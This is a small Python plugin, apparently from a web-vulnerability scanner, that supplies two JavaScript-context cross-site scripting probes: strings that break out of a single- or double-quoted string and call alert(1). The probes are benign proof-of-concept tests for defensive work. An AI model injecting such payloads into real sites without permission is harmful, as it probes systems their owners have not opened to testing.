from core.payload_plugins.base import PayloadPlugin


class JSPayloads(PayloadPlugin):
    name = "js_payloads"
    context = "javascript"

    def get_payloads(self):
        return [
            "';alert(1);//",
            "\";alert(1);//"
        ]